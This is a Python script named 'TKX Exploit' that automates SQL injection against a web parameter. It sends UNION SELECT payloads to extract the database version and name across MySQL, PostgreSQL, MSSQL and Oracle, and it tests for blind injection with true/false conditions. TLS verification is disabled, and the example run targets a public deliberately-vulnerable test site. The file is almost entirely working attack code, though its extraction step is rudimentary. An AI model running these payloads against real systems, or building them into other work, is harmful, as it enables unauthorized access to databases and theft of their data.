#!/usr/bin/env python3
from typing import Tuple
"""
TKX Exploit - Basic SQL Injection Exploitation
"""
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode

class TKXExploit:
    """Basic exploitation functions"""
    
    def __init__(self, vulnerable_url: str, parameter: str):
        self.url = vulnerable_url
        self.param = parameter
        self.session = requests.Session()
        self.session.verify = False
    
    def extract_version(self) -> str:
        """Extract database version"""
        payloads = {
            'mysql': "' UNION SELECT @@version,NULL-- ",
            'postgresql': "' UNION SELECT version(),NULL-- ",
            'mssql': "' UNION SELECT @@version,NULL-- ",
            'oracle': "' UNION SELECT banner,NULL FROM v$version-- "
        }
        
        for db, payload in payloads.items():
            try:
                parsed = urlparse(self.url)
                params = parse_qs(parsed.query)
                params[self.param] = [payload]
                
                response = self.session.get(
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                    params=params,
                    timeout=10
                )
                
                if response.status_code == 200:
                    # Simple extraction - in real tool would need parsing
                    return f"{db}: Version data in response"
                    
            except:
                continue
        
        return "Unknown"
    
    def extract_database(self) -> str:
        """Extract current database name"""
        payloads = {
            'mysql': "' UNION SELECT database(),NULL-- ",
            'postgresql': "' UNION SELECT current_database(),NULL-- ",
            'mssql': "' UNION SELECT DB_NAME(),NULL-- "
        }
        
        for db, payload in payloads.items():
            try:
                parsed = urlparse(self.url)
                params = parse_qs(parsed.query)
                params[self.param] = [payload]
                
                response = self.session.get(
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                    params=params,
                    timeout=10
                )
                
                if response.status_code == 200:
                    return f"{db}: Database name in response"
                    
            except:
                continue
        
        return "Unknown"
    
    def test_blind_injection(self) -> bool:
        """Test for blind SQL injection"""
        true_payload = f"' AND 1=1-- "
        false_payload = f"' AND 1=2-- "
        
        try:
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            
            # Test true condition
            params[self.param] = [true_payload]
            true_response = self.session.get(
                f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                params=params,
                timeout=10
            )
            
            # Test false condition  
            params[self.param] = [false_payload]
            false_response = self.session.get(
                f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                params=params,
                timeout=10
            )
            
            # Compare responses
            if true_response.text != false_response.text:
                return True
                
        except:
            pass
        
        return False

# Example usage
if __name__ == "__main__":
    exploiter = TKXExploit(
        "http://testphp.vulnweb.com/artists.php?artist=1",
        "artist"
    )
    
    print("[*] Testing exploitation...")
    print(f"Version: {exploiter.extract_version()}")
    print(f"Database: {exploiter.extract_database()}")
    print(f"Blind injection: {exploiter.test_blind_injection()}")
